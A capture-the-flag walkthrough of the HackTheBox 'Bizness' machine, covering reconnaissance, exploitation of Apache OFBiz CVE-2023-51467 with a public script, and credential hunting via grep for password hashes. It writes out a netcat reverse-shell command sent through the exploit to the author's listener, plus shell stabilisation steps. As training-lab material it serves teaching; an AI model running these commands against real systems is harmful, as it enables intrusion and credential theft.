---
slug: bizness
hide:
    - navigation
tags:
    - HackTheBox
    - Writeups
    - Walkthrough
    - Linux
    - Web
    - Apache OFBiz
---

[:octicons-arrow-left-24: Back to HackTheBox Writeups](/docs/pages/writeups/htb/index.md){ .sm-button }

# **Bizness**

![](https://live.staticflickr.com/65535/53513263261_2f4f606f86_c.jpg){loading=lazy}

??? info "Information"
    **Machine**: [Bizness](https://app.hackthebox.com/machines/582)  
    **Level**: `Easy`  
    **Tags**: `Linux`, `Web`, `Apache OFBiz`  
    **Pwn**: [Pwned by 0xrh0d4m1n](https://www.hackthebox.com/achievement/machine/1013077/582)

---

## 🚀 **Starting**

It is always good to add the machine to `hosts` file.

```bash
echo '10.10.11.252 bizness.htb' | sudo tee -a /etc/hosts
```

---

## 🔭 **Reconnaissance**

For the reconnaissance lets execute port scanning using nmap.
```bash
sudo nmap -sV -sC -T2 -A -O -f -Pn --top-ports 100 -oN top100.nmap bizness.htb

```
### Port Enumeration

Analyzing the results:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-06 14:54 EST
Nmap scan report for bizness.htb (10.10.11.252)
Host is up (0.23s latency).
Not shown: 97 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp  open  http     nginx 1.18.0
|_http-title: Did not follow redirect to https://bizness.htb/
|_http-server-header: nginx/1.18.0
443/tcp open  ssl/http nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: BizNess Incorporated
| tls-nextprotoneg:
|_  http/1.1
| tls-alpn:
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Not valid before: 2023-12-14T20:03:40
|_Not valid after:  2328-11-10T20:03:40
Aggressive OS guesses: Linux 5.0 (96%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), Linux 4.15 - 5.8 (94%), Linux 5.3 - 5.4 (94%), Linux 2.6.32 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1720/tcp)
HOP RTT       ADDRESS
1   230.92 ms 10.10.14.1
2   230.83 ms bizness.htb (10.10.11.252)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 116.92 seconds
```

### Service Enumeration

Throughout the results we have the following important information:

- [X] SSH Available (Debian-Based System): `22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)`
- [X] HTTP Available (Nginx 1.18.0): `80/tcp  open  http     nginx 1.18.0`
- [X] HTTPS Available (SSL-CERT.): `443/tcp open  ssl/http nginx 1.18.0`

### Manual Recon

Let's take a look into this domain
```bash
curl -LIk bizness.htb
```
We've got the following response
```http
HTTP/1.1 301 Moved Permanently
Server: nginx/1.18.0
Date: Tue, 06 Feb 2024 20:20:56 GMT
Content-Type: text/html
Content-Length: 169
Connection: keep-alive
Location: https://bizness.htb/
```
```http
HTTP/1.1 200
Server: nginx/1.18.0
Date: Tue, 06 Feb 2024 20:20:56 GMT
Content-Type: text/html
Content-Length: 27200
Connection: keep-alive
Set-Cookie: JSESSIONID=C09468E288C30B549AE918C7B3D7F58E.jvm1; Path=/; Secure; HttpOnly; SameSite=strict
Accept-Ranges: bytes
ETag: W/"27200-1702887508516"
Last-Modified: Mon, 18 Dec 2023 08:18:28 GMT
vary: accept-encoding
```
As we can see, it is redirecting permanently (`HTTP 301`) from HTTP (`80`) to HTTPS (`443`), forcing the use of SSL/HTTP 

Looking into the Homepage  
![](https://live.staticflickr.com/65535/53517385049_141786a280_o.png){.maxH300 loading=lazy}

Their footer has an useful information: `Apache OFBiz`  
![](https://live.staticflickr.com/65535/53517385009_83f68e4cd2_o.png){.maxH300 loading=lazy}


### Content Discovery

For now, we have got to run some directory enumeration to see what we will get.
```
$ feroxbuster --insecure --depth '1' --dont-extract-links --auto-tune --status-codes '200' --wordlist '/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt' --no-state --url https://bizness.htb

___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.1
───────────────────────────┬──────────────────────
🎯  Target Url            │ https://bizness.htb
🚀  Threads               │ 50
📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
👌  Status Codes          │ [200]
💥  Timeout (secs)        │ 7
🦡  User-Agent            │ feroxbuster/2.10.1
💉  Config File           │ /etc/feroxbuster/ferox-config.toml
🏁  HTTP methods          │ [GET]
🔓  Insecure              │ true
🎶  Auto Tune             │ true
🔃  Recursion Depth       │ 1
───────────────────────────┴──────────────────────
🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      522l     1736w    27200c https://bizness.htb/
200      GET      492l     1596w    34633c https://bizness.htb/control
[####################] - 7m     87650/87650   0s      found:2       errors:0
[####################] - 7m     87650/87650   216/s   https://bizness.htb/                        
```

We found a dir named `/control`, I will run one more time at this new endpoint.
```
$ feroxbuster --insecure --depth '1' --dont-extract-links --auto-tune --status-codes '200' --wordlist '/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt' --no-state --url https://bizness.htb/control

___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.1
───────────────────────────┬──────────────────────
🎯  Target Url            │ https://bizness.htb/control
🚀  Threads               │ 50
📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
👌  Status Codes          │ [200]
💥  Timeout (secs)        │ 7
🦡  User-Agent            │ feroxbuster/2.10.1
💉  Config File           │ /etc/feroxbuster/ferox-config.toml
🏁  HTTP methods          │ [GET]
🔓  Insecure              │ true
🎶  Auto Tune             │ true
🔃  Recursion Depth       │ 1
───────────────────────────┴──────────────────────
🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      492l     1596w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      185l      598w    11059c https://bizness.htb/control/login
200      GET      140l      496w     9307c https://bizness.htb/control/main
200      GET      179l      580w    10755c https://bizness.htb/control/help
200      GET      140l      496w     9307c https://bizness.htb/control/view
200      GET      179l      580w    10755c https://bizness.htb/control/logout
200      GET      140l      496w     9307c https://bizness.htb/control/views
200      GET      174l      593w    11059c https://bizness.htb/control/forgotPassword
200      GET      255l      609w    16481c https://bizness.htb/control/16037
200      GET      255l      609w    16481c https://bizness.htb/control/idm_logo
200      GET      255l      610w    16481c https://bizness.htb/control/ham
200      GET      255l      609w    16481c https://bizness.htb/control/pubblicazioni
```

The scanning was taking too much time, so, I finished the scan an decided to check out this `/control/login`  

```shell
curl -Lik https://bizness.htb/control/login
```
Header Response:
```http
HTTP/1.1 200
Server: nginx/1.18.0
Date: Wed, 07 Feb 2024 00:16:00 GMT
Content-Type: text/html;charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Set-Cookie: JSESSIONID=BC097C1E4C89D9648F700A4F67A19CEF.jvm1; Path=/; Secure; HttpOnly; SameSite=strict
Cache-Control: Set-Cookie
x-frame-options: sameorigin
strict-transport-security: max-age=31536000; includeSubDomains
x-content-type-options: nosniff
X-XSS-Protection: 1; mode=block
Referrer-Policy: no-referrer-when-downgrade
Content-Security-Policy-Report-Only: default-src 'self'
Set-Cookie: OFBiz.Visitor=10601; Max-Age=31536000; Expires=Thu, 06 Feb 2025 00:15:58 GMT; Path=/; Secure; HttpOnly; SameSite=strict
vary: accept-encoding
```

Body Response:
```html
<!DOCTYPE html>
<!-- Begin Screen component://common/widget/CommonScreens.xml#login -->
<!-- Begin Screen component://common/widget/CommonScreens.xml#MinimalActions -->
<!-- End Screen component://common/widget/CommonScreens.xml#MinimalActions -->
<!-- Begin Screen component://common-theme/widget/CommonScreens.xml#login -->
<!-- Begin Screen component://bizness/widget/CommonScreens.xml#main-decorator -->
<!-- Begin Screen component://common/widget/CommonScreens.xml#GlobalDecorator -->
<!-- Begin Screen component://common/widget/CommonScreens.xml#GlobalActions -->
<!-- Begin Screen component://common/widget/CommonScreens.xml#MinimalActions -->
<!-- End Screen component://common/widget/CommonScreens.xml#MinimalActions -->
<!-- Begin Screen component://common-theme/widget/CommonScreens.xml#GlobalActions -->
<!-- End Screen component://common-theme/widget/CommonScreens.xml#GlobalActions -->
<!-- End Screen component://common/widget/CommonScreens.xml#GlobalActions -->
<!-- Begin Screen component://common-theme/widget/CommonScreens.xml#GlobalDecorator -->
<!-- Begin Section Widget  -->
<!-- End Section Widget  -->
<!-- Begin Section Widget  -->
<!-- Begin Template component://rainbowstone/template/includes/Header.ftl -->
<html lang="en" dir="ltr" xmlns="http://www.w3.org/1999/xhtml">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <title>OFBiz: bizness: Login</title>
    <link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon">
    <link rel="icon" href="/images/favicon.png" type="image/png">
    <link rel="icon" sizes="32x32" href="/images/favicon-32.png" type="image/png">
    <link rel="icon" sizes="64x64" href="/images/favicon-64.png" type="image/png">
    <link rel="icon" sizes="96x96" href="/images/favicon-96.png" type="image/png">
    <link rel="stylesheet/less" href="/rainbowstone/rainbowstone-saphir.less" />
    <script src="/common/js/jquery/jquery-3.5.1.min.js" type="application/javascript"></script>
    <script src="/common/js/jquery/jquery-migrate-3.3.0.min.js" type="application/javascript"></script>
    <script src="/common/js/jquery/plugins/browser-plugin/jquery.browser-0.1.0.min.js" type="application/javascript"></script>
    <script src="/common/js/jquery/ui/jquery-ui-1.12.1.min.js" type="application/javascript"></script>
    <script src="/common/js/jquery/plugins/select2/js/select2-4.0.6.js" type="application/javascript"></script>
    <script src="/common/js/jquery/plugins/datetimepicker/jquery-ui-timepicker-addon-1.6.3.min.js" type="application/javascript"></script>
    <script src="/common/js/jquery/plugins/fjTimer/jquerytimer-min.js" type="application/javascript"></script>
    <script src="/common/js/jquery/plugins/mask/jquery.mask-1.14.13.min.js" type="application/javascript"></script>
    <script src="/common/js/jquery/plugins/jeditable/jquery.jeditable-1.7.3.js" type="application/javascript"></script>
    <script src="/common/js/jquery/plugins/validate/jquery.validate.min.js" type="application/javascript"></script>
    <script src="/common/js/plugins/OpenLayers-5.3.0.js" type="application/javascript"></script>
    <script src="/common/js/jquery/plugins/elrte-1.3/js/elrte.min.js" type="application/javascript"></script>
    <script src="/common/js/util/dompurify/dist/purify.min.js" type="application/javascript"></script>
    <script src="/common/js/util/OfbizUtil.js" type="application/javascript"></script>
    <script src="/common/js/util/fieldlookup.js" type="application/javascript"></script>
    <script src="/common/js/plugins/date/date.format-1.2.3-min.js" type="application/javascript"></script>
    <script src="/common/js/plugins/date/date.timezone-min.js" type="application/javascript"></script>
    <script src="/common/js/util/miscAjaxFunctions.js" type="application/javascript"></script>
    <script src="/common/js/util/selectMultipleRelatedValues.js" type="application/javascript"></script>
    <script src="/common/js/util/util.js" type="application/javascript"></script>
    <script src="/common/js/jquery/plugins/jsTree/jquery.jstree.js" type="application/javascript"></script>
    <script src="/common/js/jquery/ui/js/jquery.cookie-1.4.0.js" type="application/javascript"></script>
    <script src="/common/js/plugins/date/FromThruDateCheck.js" type="application/javascript"></script>
    <script src="/common/js/util/application.js" type="application/javascript"></script>
    <script src="/rainbowstone/js/less.min.js" type="application/javascript"></script>
    <script src="/common/js/plugins/moment-timezone/moment-with-locales.min.js" type="application/javascript"></script>
    <script src="/common/js/plugins/moment-timezone/moment-timezone-with-data.min.js" type="application/javascript"></script>
    <script src="/common/js/util/setUserTimeZone.js" type="application/javascript"></script>
    <script src="/common/js/jquery/plugins/select2/js/i18n/en.js" type="application/javascript"></script>
    <script src="/common/js/jquery/plugins/datetimepicker/i18n/jquery-ui-timepicker-en.js" type="application/javascript"></script>
    <script src="/common/js/jquery/plugins/validate/localization/messages_en.js" type="application/javascript"></script>
    <script src="/common/js/jquery/ui/i18n/datepicker-en.js" type="application/javascript"></script>
    <script src="/common/js/jquery/plugins/datejs/date-en-US.js" type="application/javascript"></script>
    <script src="/common/js/jquery/plugins/Readmore.js-master/readmore.js" type="application/javascript"></script>
    <script src="/common/js/jquery/plugins/jquery-jgrowl/jquery.jgrowl-1.4.6.min.js" type="application/javascript"></script>

    <link rel="stylesheet" href="/common/css/impersonate.css" type="text/css" />
    <link rel="stylesheet" href="/common/js/jquery/plugins/jquery-jgrowl/jquery.jgrowl-1.4.6.min.css" type="text/css" />
    <link rel="stylesheet" href="/common/js/jquery/plugins/elrte-1.3/css/elrte.min.css" type="text/css" />
    <link rel="stylesheet" href="/common/js/jquery/ui/jquery-ui-1.12.1.min.css" type="text/css" />
    <link rel="stylesheet" href="/common/js/jquery/plugins/datetimepicker/jquery-ui-timepicker-addon-1.6.3.min.css" type="text/css" />
    <link rel="stylesheet" href="/common/js/jquery/plugins/select2/css/select2-4.0.6.css" type="text/css" />
    <link rel="stylesheet" href="/rainbowstone/style.css" type="text/css" />
    <link rel="stylesheet" href="/rainbowstone/flag-icon.min.css" type="text/css" />
    <link rel="stylesheet" href="/rainbowstone/javascript.css" type="text/css" />
</head>
<!-- End Template component://rainbowstone/template/includes/Header.ftl -->
<!-- Begin Section Widget Render-Main-Nav -->
<!-- Begin Template component://rainbowstone/template/includes/TopAppBar.ftl -->

<body>

    <div id="wait-spinner" style="display:none">
        <div id="wait-spinner-image"></div>
    </div>
    <div class="page-container">
        <div class="hidden">
            <a href="#column-container" title="Skip navigation" accesskey="2">
Skip navigation
</a>
        </div>
        <!-- End Template component://rainbowstone/template/includes/TopAppBar.ftl -->
        <!-- End Section Widget Render-Main-Nav -->
        <!-- End Section Widget  -->
        <!-- Begin Section Widget  -->
        <!-- Begin Section Widget Render-App-Nav -->
        <!-- End Section Widget Render-App-Nav -->
        <!-- End Section Widget  -->
        <!-- Begin Section Widget  -->
        <!-- End Section Widget  -->
        <!-- Begin Template component://common-theme/template/includes/Messages.ftl -->

        <div id="content-messages" class="content-messages errorMessage" onclick="document.getElementById('content-messages').parentNode.removeChild(this)">
            <p>The Following Errors Occurred:</p>
            <p>username was empty reenter</p>
            <p>password was empty reenter</p>
        </div>

        <script>
            showjGrowl(
            "Show All", "Collapse", "Hide all the notifications",
            "center", "800", "", "100");
        </script>
        <!-- End Template component://common-theme/template/includes/Messages.ftl -->

        <div class="contentarea">

            <div id="column-container">
                <!-- Begin Section Widget  -->

                <div id="content-main-section">
                    <!-- Begin Section Widget  -->
                    <!-- End Section Widget  -->
                    <!-- Begin Template component://rainbowstone/template/Login.ftl -->

                    <div id="loginBar"><span>Login</span>
                        <div id="company-logo"></div>
                    </div>
                    <center>
                        <div class="screenlet login-screenlet">
                            <div class="screenlet-title-bar">
                                <h3>Registered User</h3>
                            </div>
                            <div class="screenlet-body">
                                <form method="post" action="https://bizness.htb:443/control/login" name="loginform">
                                    <table class="basic-table" cellspacing="0">
                                        <tr>
                                            <td class="label">User Name</td>
                                            <td><input type="text" name="USERNAME" value="" size="20" /></td>
                                        </tr>
                                        <tr>
                                            <td class="label">Password</td>
                                            <td><input type="password" name="PASSWORD" autocomplete="off" value="" size="20" /></td>
                                        </tr>
                                        <tr>
                                            <td colspan="2" align="center">
                                                <input type="submit" value="Login" />
                                            </td>
                                        </tr>
                                    </table>
                                    <input type="hidden" name="JavaScriptEnabled" value="N" />
                                    <br />
                                    <a href="https://bizness.htb:443/control/forgotPassword">Forgot Your Password?</a>
                                </form>
                            </div>
                        </div>
                    </center>

                    <script type="application/javascript">
                        document.loginform.JavaScriptEnabled.value = "Y";
                        document.loginform.USERNAME.focus();
                    </script>
                    <!-- End Template component://rainbowstone/template/Login.ftl -->
                </div>
                <!-- End Section Widget  -->

                <div class="clear">
                </div>
            </div>
        </div>
        <!-- Begin Section Widget  -->
        <!-- Begin Section Widget Render-Footer -->
        <!-- Begin Template component://rainbowstone/template/includes/Footer.ftl -->
        <div id="footer-offset"></div>
        <div id="footer">
            <span>2/6/24, 7:15 PM - <a href="https://bizness.htb:443/control/ListTimezones">Eastern Daylight Time</a></span>
            <span>Copyright (c) 2001-2024
<a href="http://www.apache.org" target="_blank">The Apache Software Foundation</a>. Powered by
<a href="http://ofbiz.apache.org" target="_blank">Apache OFBiz.</a> Release
18.12
</span>
        </div>
    </div>
    <script type="application/javascript" src="/rainbowstone/js/rainbowstone.js"></script>
</body>

</html>
<!-- End Template component://rainbowstone/template/includes/Footer.ftl -->
<!-- End Section Widget Render-Footer -->
<!-- End Section Widget  -->
<!-- End Screen component://common-theme/widget/CommonScreens.xml#GlobalDecorator -->
<!-- End Screen component://common/widget/CommonScreens.xml#GlobalDecorator -->
<!-- End Screen component://bizness/widget/CommonScreens.xml#main-decorator -->
<!-- End Screen component://common-theme/widget/CommonScreens.xml#login -->
<!-- End Screen component://common/widget/CommonScreens.xml#login -->
```

Looking through the page and also the `HTML` code, it is possible to confirm the usage of `Apache OFBiz`, this is relevant information.  
![](https://live.staticflickr.com/65535/53517233573_bfcf0b0307_o.png){.maxH300 loading=lazy}

```html
<a href="http://ofbiz.apache.org" target="_blank">Apache OFBiz.</a> Release 18.12
```

Now, since we have the information about the application used and its version, it's time to do some researching for vulnerabilities.  

---

## 🪲 **Vulnerability Scan**

I searched for **Apache OFBiz 18.12 CVE**. After looking through the results, I found the **CVE Details** webpage, which is a great site where you can find aggregated vulnerabilities for applications or other software that you are assessing.   

In the page of [**CVE Details** for **Apache OFBiz v18.12**](https://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-28350/version_id-784595/Apache-Ofbiz-18.12.04.html), I found a `recent` and **critical** (_CVSS:_`9.8`) vulnerability that seems exploitable **CVE-2023-51467**.  

We can start by trying to exploit it, also, you can read about the details in [this article on **Hacker News**](https://thehackernews.com/2023/12/critical-zero-day-in-apache-ofbiz-erp.html)

It is also important that you give a look into [this more detailed article from **Vulncheck**](https://vulncheck.com/blog/ofbiz-cve-2023-51467), it brings a good approach to the exploitation using a non-touching disk technique, great for evasion.

---

## 🎯 **Exploit**

Throughout my research on the internet I could verify that there are a great number of exploits for this vulnerability available.

### Weaponization

I will be using [this one](https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass) developed by [Jakabakos](https://github.com/jakabakos).

```bash
$ git clone https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass
Cloning into 'Apache-OFBiz-Authentication-Bypass'...
remote: Enumerating objects: 14, done.
remote: Counting objects: 100% (9/9), done.
remote: Compressing objects: 100% (8/8), done.
remote: Total 14 (delta 1), reused 6 (delta 0), pack-reused 5
Receiving objects: 100% (14/14), 51.44 MiB | 15.29 MiB/s, done.
Resolving deltas: 100% (1/1), done.
$ cd Apache-OFBiz-Authentication-Bypass
$ ll
total 58148
-rw-r--r-- 1 user user     1676 Feb  7 07:06 README.md
-rwxr-xr-x 1 user user     4335 Feb  7 07:06 exploit.py
-rw-r--r-- 1 user user     1352 Feb  7 07:06 xdetection.py
-rwxr-xr-x 1 user user 59525376 Feb  7 07:06 ysoserial-all.jar
$ python3 ./exploit.py --help
usage: exploit.py [-h] --url URL [--cmd CMD]

Exploit script for Apache EFBiz auth vulnerability (CVE-2023-49070 and CVE-2023-51467).

options:
-h, --help  show this help message and exit
--url URL   EFBIZ's URL to send requests to.
--cmd CMD   Command to run on the remote server. Optional.
```

Setting up the Netcat Listener...
```bash
$ nc -lnvp 13337
listening on [any] 13337 ...
```

### Delivery and Exploitation

Running the exploit...
```bash
$ python3 ./exploit.py --url https://bizness.htb:443 --cmd 'nc 10.10.14.16 13337 -e /bin/sh'
[+] Generating payload...
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[+] Payload generated successfully.
[+] Sending malicious serialized payload...
[+] The request has been successfully sent. Check the result of the command.
```

### Initial Access

Stabilizing Netcat...
```bash
connect to [10.10.14.16] from (UNKNOWN) [10.10.11.252] 53338
whoami
ofbiz
uname -a
Linux bizness 5.10.0-26-amd64 #1 SMP Debian 5.10.197-1 (2023-09-29) x86_64 GNU/Linux
which python3
/bin/python3
python3 -c "import pty;pty.spawn('/usr/bin/bash');" && export TERM=xterm
ofbiz@bizness:/opt/ofbiz$ ^Z
zsh: suspended  nc -lnvp 13337
$ stty raw -echo; fg;
[1]  + continued  nc -lnvp 13337
```

Looking around...
```bash
ofbiz@bizness:/opt/ofbiz$ ls -laX
total 252
-rw-r--r--  1 ofbiz ofbiz-operator  7136 Oct 13 12:04 APACHE2_HEADER
drwxr-xr-x 14 ofbiz ofbiz-operator  4096 Dec 21 09:15 applications
drwxr-xr-x 10 ofbiz ofbiz-operator  4096 Dec 21 09:15 build
drwxr-xr-x  3 ofbiz ofbiz-operator  4096 Dec 21 09:15 config
drwxr-xr-x  4 ofbiz ofbiz-operator  4096 Dec 21 09:15 docker
-rw-r--r--  1 ofbiz ofbiz-operator  4980 Oct 13 12:04 Dockerfile
drwxr-xr-x  3 ofbiz ofbiz-operator  4096 Dec 21 09:15 docs
drwxr-xr-x 19 ofbiz ofbiz-operator  4096 Dec 21 09:15 framework
drwxr-xr-x  3 ofbiz ofbiz-operator  4096 Dec 21 09:15 gradle
-rwxr-xr-x  1 ofbiz ofbiz-operator  6134 Oct 13 12:04 gradlew
-rw-r--r--  1 ofbiz ofbiz-operator  2672 Oct 13 12:04 INSTALL
drwxr-xr-x  2 ofbiz ofbiz-operator  4096 Dec 21 09:15 lib
-rw-r--r--  1 ofbiz ofbiz-operator 13324 Oct 29 07:47 LICENSE
-rw-r--r--  1 ofbiz ofbiz-operator   166 Oct 13 12:04 NOTICE
-rw-r--r--  1 ofbiz ofbiz-operator  1747 Oct 13 12:04 OPTIONAL_LIBRARIES
drwxr-xr-x 24 ofbiz ofbiz-operator  4096 Dec 21 09:15 plugins
drwxr-xr-x  9 ofbiz ofbiz-operator  4096 Dec 21 09:15 runtime
drwxr-xr-x  7 ofbiz ofbiz-operator  4096 Dec 21 09:15 themes
-rw-r--r--  1 ofbiz ofbiz-operator     6 Oct 13 12:04 VERSION
drwxr-xr-x 15 ofbiz ofbiz-operator  4096 Jan  3 04:42 .
drwxr-xr-x  3 root  root            4096 Dec 21 09:15 ..
-rw-r--r--  1 ofbiz ofbiz-operator 31656 Oct 13 12:04 README.adoc
-rw-r--r--  1 ofbiz ofbiz-operator  3185 Oct 13 12:04 gradlew.bat
-rwxr-xr-x  1 ofbiz ofbiz-operator  1246 Oct 13 12:04 init-gradle-wrapper.bat
-rw-r--r--  1 ofbiz ofbiz-operator   944 Oct 13 12:04 .gitattributes
drwxr-xr-x  3 ofbiz ofbiz-operator  4096 Dec 21 09:15 .github
-rw-r--r--  1 ofbiz ofbiz-operator   643 Oct 13 12:04 .gitignore
-rw-r--r--  1 ofbiz ofbiz-operator 48733 Oct 13 12:04 build.gradle
-rw-r--r--  1 ofbiz ofbiz-operator  2492 Oct 13 12:04 common.gradle
drwxr-xr-x  5 ofbiz ofbiz-operator  4096 Dec 21 09:15 .gradle
-rw-r--r--  1 ofbiz ofbiz-operator  1246 Oct 13 12:04 settings.gradle
-rw-r--r--  1 ofbiz ofbiz-operator   278 Oct 13 12:04 .hgignore
-rw-r--r--  1 ofbiz ofbiz-operator   145 Oct 13 12:04 npm-shrinkwrap.json
-rw-r--r--  1 ofbiz ofbiz-operator  9432 Oct 13 12:04 DOCKER.md
-rw-r--r--  1 ofbiz ofbiz-operator   893 Oct 13 12:04 SECURITY.md
-rw-r--r--  1 ofbiz ofbiz-operator  1185 Oct 13 12:04 gradle.properties
-rw-r--r--  1 ofbiz ofbiz-operator  1969 Oct 13 12:04 .xmlcatalog.xml
```

---

## 🏁 **Flag Exfiltration**

#### User Flag
```bash
ofbiz@bizness:/opt/ofbiz$ cd ~
ofbiz@bizness:~$ ls -la
total 32
drwxr-xr-x 4 ofbiz ofbiz-operator 4096 Jan  8 05:31 .
drwxr-xr-x 3 root  root           4096 Dec 21 09:15 ..
lrwxrwxrwx 1 root  root              9 Dec 16 05:21 .bash_history -> /dev/null
-rw-r--r-- 1 ofbiz ofbiz-operator  220 Dec 14 14:24 .bash_logout
-rw-r--r-- 1 ofbiz ofbiz-operator 3560 Dec 14 14:30 .bashrc
drwxr-xr-x 8 ofbiz ofbiz-operator 4096 Dec 21 09:15 .gradle
drwxr-xr-x 3 ofbiz ofbiz-operator 4096 Dec 21 09:15 .java
-rw-r--r-- 1 ofbiz ofbiz-operator  807 Dec 14 14:24 .profile
-rw-r----- 1 root  ofbiz-operator   33 Feb  7 07:03 user.txt
ofbiz@bizness:~$ cat user.txt
#* * * ALERT * * * * * * * * * * * * * * * * 
#* If you really want to see this flag, go * 
#* to FLAG CODES at the bottom of the page *
#* * * * * * * * * * * * * * * * * * * * * *
```

### **Privilege Escalation**

Finding the user flag for the user `ofbiz` was easy-peasy. Now lets get started to search valuable information to help us in the next step, root access.  
Getting back to the application directory, we can use `grep` for this task, with this `regex` we will be searching for sensitive data.  
> _**TIP**: It is important to use the flag `-a` in `grep` for this action, since it will also include binaries in the search._  

```bash
ofbiz@bizness:~$ cd /opt/ofbiz
ofbiz@bizness:/opt/ofbiz$ grep -raTinHo -E 'password(=|[[:space:]]|:)([a-zA-Z]|[0-9]|[[:punct:]])+' .
```

After running, we can notice a notable number of `SHA` hashes present in this directory. Filtering the output noise by fine-tuning the regex to match only `SHA`, we get a more refined output:
```bash
ofbiz@bizness:/opt/ofbiz$ grep -raTinHo -E 'password([[:punct:]]){1,}sha([[:punct:]]){1,}([a-zA-Z]|[0-9]|[[:punct:]])+' .
./applications/datamodel/data/demo/WorkEffortDemoData.xml:  57: Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"
./applications/datamodel/data/demo/HumanresDemoData.xml:  63:   Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"
./applications/datamodel/data/demo/HumanresDemoData.xml:  66:   Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"
./applications/datamodel/data/demo/MarketingDemoData.xml:   83: Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"
./applications/datamodel/data/demo/MarketingDemoData.xml:   93: Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"
./applications/datamodel/data/demo/PartyDemoData.xml:  94:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"
./applications/datamodel/data/demo/ProductDemoData.xml:   96:   Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./applications/datamodel/data/demo/ProductDemoData.xml:  103:   Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./applications/datamodel/data/demo/ProductDemoData.xml:  110:   Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./applications/datamodel/data/demo/OrderDemoData.xml:   127:    Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./applications/datamodel/data/demo/OrderDemoData.xml:   128:    Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./applications/datamodel/data/demo/OrderDemoData.xml:   129:    Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./applications/datamodel/data/demo/OrderDemoData.xml:   130:    Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./applications/datamodel/data/demo/OrderDemoData.xml:   131:    Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./applications/datamodel/data/demo/OrderDemoData.xml:   132:    Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./applications/datamodel/data/demo/OrderDemoData.xml:   133:    Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./applications/datamodel/data/demo/ContentDemoData.xml:  135:   Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./applications/datamodel/data/demo/ContentDemoData.xml:  143:   Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./applications/datamodel/data/demo/ContentDemoData.xml:  151:   Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./applications/datamodel/data/demo/ContentDemoData.xml:  159:   Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./applications/datamodel/data/demo/ContentDemoData.xml:  163:   Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./applications/datamodel/data/demo/ContentDemoData.xml:  192:   Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./applications/datamodel/data/demo/ContentDemoData.xml:  193:   Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./applications/datamodel/data/demo/ContentDemoData.xml:  194:   Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
